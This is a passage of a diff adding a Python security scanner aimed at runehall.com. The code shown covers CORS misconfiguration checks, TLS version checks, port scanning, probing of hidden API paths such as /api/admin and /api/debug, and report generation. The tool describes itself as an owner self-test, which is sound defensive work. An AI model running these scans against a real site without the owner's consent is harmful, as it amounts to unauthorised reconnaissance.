+            # Bad: wildcard ACAO with credentials; or evil.example echoed back
+            bad = (acao == "*" and acac == "true") or \
+                  ("evil.example" in acao) or \
+                  (acao == "null")
+            if bad:
+                out.append(F(id=f"CORS-{origin}-{method}", cls="cors", target=EP["notifications"],
+                             status="CONFIRMED", severity="HIGH", confidence="HIGH", cvss=7.4,
+                             evidence=f"Origin={origin} ACAO={acao!r} ACAC={acac!r}",
+                             remediation="Allowlist specific origins; never combine ACAO=* "
+                                         "with credentials=true",
+                             compliance=["OWASP A05","CWE-942","ASVS 14.5.3"]))
+    # If nothing bad, record a positive
+    if not any(f.cls=="cors" for f in out):
+        out.append(F(id="CORS-matrix", cls="cors", target=EP["notifications"],
+                     status="NOT_REPRODUCED", severity="INFO", confidence="HIGH",
+                     evidence="CORS preflight correctly scoped to runehall.com for all tested origins"))
+    return out
+
+# ═══════════════════════════════════════════════════════════════
+# SUITE 13 — TLS
+# ═══════════════════════════════════════════════════════════════
+
+def suite_tls():
+    out = []
+    for host in ("runehall.com", "api.runehall.com", "p2.runehall.com"):
+        try:
+            ctx = ssl.create_default_context()
+            with socket.create_connection((host, 443), timeout=TIMEOUT) as sock:
+                with ctx.wrap_socket(sock, server_hostname=host) as ss:
+                    ver = ss.version()
+                    cipher = ss.cipher()
+                    cert = ss.getpeercert()
+                    if ver and ver.startswith("TLSv1.0") or ver.startswith("TLSv1.1"):
+                        out.append(F(id=f"TLS-weak-{host}", cls="tls", target=host,
+                                     status="CONFIRMED", severity="HIGH", confidence="HIGH",
+                                     cvss=6.5, evidence=f"Negotiated {ver}",
+                                     remediation="Require TLSv1.2+; disable TLSv1.0/1.1",
+                                     compliance=["NIST SC-8","ASVS 9.1.2"]))
+                    else:
+                        out.append(F(id=f"TLS-ok-{host}", cls="tls", target=host,
+                                     status="NOT_REPRODUCED", severity="INFO",
+                                     confidence="HIGH",
+                                     evidence=f"TLS {ver}, cipher {cipher[0] if cipher else '?'}"))
+        except ssl.SSLError as e:
+            out.append(F(id=f"TLS-err-{host}", cls="tls", target=host, status="ERROR",
+                         severity="INFO", evidence=f"SSL error: {e}"))
+        except Exception as e:
+            out.append(F(id=f"TLS-err-{host}", cls="tls", target=host, status="ERROR",
+                         severity="INFO", evidence=str(e)[:120]))
+    return out
+
+# ═══════════════════════════════════════════════════════════════
+# SUITE 14 — PORTS
+# ═══════════════════════════════════════════════════════════════
+
+def suite_ports():
+    out = []
+    for host in ("runehall.com", "api.runehall.com", "p2.runehall.com"):
+        opens = []
+        for p in PORTS:
+            try:
+                with socket.create_connection((host, p), timeout=2): opens.append(p)
+            except OSError: pass
+        if opens:
+            out.append(F(id=f"PORT-{host}", cls="ports", target=host, status="LIKELY",
+                         severity="LOW", confidence="HIGH", cvss=3.1,
+                         evidence=f"Open: {opens}",
+                         remediation="Close or restrict to trusted IPs",
+                         compliance=["NIST SC-7","ASVS 1.14.2"]))
+        else:
+            out.append(F(id=f"PORT-{host}", cls="ports", target=host, status="NOT_REPRODUCED",
+                         severity="INFO", confidence="HIGH",
+                         evidence="No common ports reachable"))
+    return out
+
+# ═══════════════════════════════════════════════════════════════
+# SUITE 15 — API DISCOVERY
+# ═══════════════════════════════════════════════════════════════
+
+def suite_discovery():
+    out = []
+    s = sess("a")
+    paths = ["/api/v1/auth", "/api/v2/auth", "/api/v1/user", "/api/v2/user",
+             "/api/beta", "/api/internal", "/api/admin", "/api/debug",
+             "/api/_internal/health", "/api/openapi.json", "/api/docs"]
+    for p in paths:
+        url = f"{API}{p}"
+        r = send(s, "GET", url)
+        if r is None: continue
+        if r.status_code in (200, 201, 202):
+            out.append(F(id=f"DISC-{p}", cls="api_discovery", target=url,
+                         status="CONFIRMED", severity="LOW", confidence="MEDIUM", cvss=3.1,
+                         evidence=f"HTTP {r.status_code} ({len(r.text)} bytes) — "
+                                  f"versioned/hidden endpoint reachable",
+                         remediation="Document intended public API surface; "
+                                     "remove accidental exposure",
+                         compliance=["NIST CM-7"]))
+    return out
+
+# ═══════════════════════════════════════════════════════════════
+# SUITE REGISTRY
+# ═══════════════════════════════════════════════════════════════
+
+SUITES = {
+    "headers":     suite_headers,
+    "sourcemap":   suite_sourcemap,
+    "idor":        suite_idor,
+    "race":        suite_race,
+    "injection":   suite_injection,
+    "auth":        suite_auth,
+    "mass":        suite_mass,
+    "ratelimit":   suite_ratelimit,
+    "methods":     suite_methods,
+    "hpp":         suite_hpp,
+    "errors":      suite_errors,
+    "cors":        suite_cors,
+    "tls":         suite_tls,
+    "ports":       suite_ports,
+    "discovery":   suite_discovery,
+}
+
+DEFAULT_SUITES = "headers,sourcemap,idor,auth,mass,cors,tls,ports,ratelimit,methods,errors,discovery"
+
+# ═══════════════════════════════════════════════════════════════
+# REPORTING
+# ═══════════════════════════════════════════════════════════════
+
+SEV_ORDER = {"CRITICAL":0,"HIGH":1,"MEDIUM":2,"LOW":3,"INFO":4}
+
+def report_markdown(findings, path):
+    conf = sum(1 for f in findings if f.status in ("CONFIRMED","LIKELY"))
+    by_sev = {s: sum(1 for f in findings if f.severity == s and f.status in ("CONFIRMED","LIKELY"))
+              for s in ("CRITICAL","HIGH","MEDIUM","LOW","INFO")}
+    lines = [
+        f"# RuneHall — Adversarial Validation Report",
+        f"",
+        f"**Generated:** {datetime.now(timezone.utc).isoformat()}  ",
+        f"**Scope:** runehall.com, api.runehall.com, p2.runehall.com  ",
+        f"**Method:** Non-destructive adversarial validation (owner self-test)  ",
+        f"**Suites run:** {conf} confirmed findings across {len(set(f.cls for f in findings))} categories  ",
+        f"",
+        f"## Executive Summary",
+        f"",
+        f"| Severity | Confirmed |",
+        f"|---|---|",
+    ]
+    for s in ("CRITICAL","HIGH","MEDIUM","LOW"):
+        lines.append(f"| {s} | {by_sev[s]} |")
+    lines += ["", "## Findings", ""]
+
+    for sev in ("CRITICAL","HIGH","MEDIUM","LOW"):
+        group = [f for f in findings if f.severity == sev and f.status in ("CONFIRMED","LIKELY")]
+        if not group: continue
+        lines.append(f"### {sev}")
+        for f in group:
+            lines += [
+                f"",
+                f"#### `{f.id}` — {f.cls}",
+                f"",
+                f"- **Target:** `{f.target}`",
+                f"- **Status:** {f.status}  |  **Confidence:** {f.confidence}  |  **CVSS:** {f.cvss}",
+                f"- **Evidence:** {f.evidence}",
+            ]
+            if f.request:  lines.append(f"- **Request:** `{f.request[:200]}`")
+            if f.response: lines.append(f"- **Response:** `{f.response[:200]}`")
+            if f.remediation:
+                lines.append(f"- **Remediation:** {f.remediation}")
+            if f.compliance:
+                lines.append(f"- **Compliance:** {', '.join(f.compliance)}")
+        lines.append("")
+    with open(path, "w") as fh:
+        fh.write("\n".join(lines))
+
+def report_json(findings, path):
+    with open(path, "w") as fh:
+        json.dump({"ts": datetime.now(timezone.utc).isoformat(),
+                   "dry_run": DRY_RUN,
+                   "findings": [asdict(f) for f in findings]}, fh, indent=2)
+
+def report_csv(findings, path):
+    if not findings: return
+    with open(path, "w", newline="") as fh:
+        w = csv.DictWriter(fh, fieldnames=list(asdict(findings[0]).keys()))
+        w.writeheader()
+        for f in findings: w.writerow(asdict(f))
+
+# ═══════════════════════════════════════════════════════════════
+# MAIN
+# ═══════════════════════════════════════════════════════════════
+
+def main():
+    ap = argparse.ArgumentParser()
+    ap.add_argument("--dry-run", action="store_true")
+    ap.add_argument("--only", default=DEFAULT_SUITES)
+    ap.add_argument("--canary", action="store_true", help="Start canary HTTP server for SSRF/XXE")
+    ap.add_argument("--out", default="validation_v2")
+    args = ap.parse_args()
+
+    global DRY_RUN
+    if args.dry_run: DRY_RUN = True
+    if args.canary:
+        start_canary()
+
+    if not TOKENS.get("a"):
+        print("WARNING: no token A — authed suites will report ERROR")
+    if not TOKENS.get("b"):
+        print("WARNING: no token B — cross-account IDOR checks skipped")
+
+    suites = [s.strip() for s in args.only.split(",") if s.strip() in SUITES]
+    if not suites: sys.exit(f"Choose from: {','.join(SUITES.keys())}")
+
+    print(f"\nRunning {len(suites)} suites against runehall.com (dry_run={DRY_RUN})\n")
+
+    all_findings = []
+    for name in suites:
+        print(f"[{name:12}]", end=" ... ", flush=True)
+        try:
+            results = SUITES[name]()
+        except SystemExit: raise
+        except Exception as e:
+            print(f"ERROR {type(e).__name__}: {e}")
+            results = [F(id=f"ERR-{name}", cls=name, target="-", status="ERROR",
+                         severity="INFO", evidence=str(e)[:200])]
+            all_findings += results; continue
+        all_findings += results
+        c = {}
+        for f in results: c[f.status] = c.get(f.status, 0) + 1
+        print(" ".join(f"{k}={v}" for k,v in sorted(c.items())))
+
+    all_findings.sort(key=lambda f: (SEV_ORDER.get(f.severity, 99), f.status, f.id))
+
+    report_json(all_findings, f"{args.out}.json")
+    report_csv(all_findings, f"{args.out}.csv")
+    report_markdown(all_findings, f"{args.out}.md")
+
+    conf = [f for f in all_findings if f.status in ("CONFIRMED","LIKELY")]
+    print(f"\n─── SUMMARY ───")
+    print(f"Confirmed: {len(conf)} / {len(all_findings)} findings")
+    for sev in ("CRITICAL","HIGH","MEDIUM","LOW"):
+        n = sum(1 for f in conf if f.severity == sev)
+        if n: print(f"  {sev:8} {n}")
+    print(f"\nWrote: {args.out}.json  {args.out}.csv  {args.out}.md")
+
+if __name__ == "__main__":
+    main()
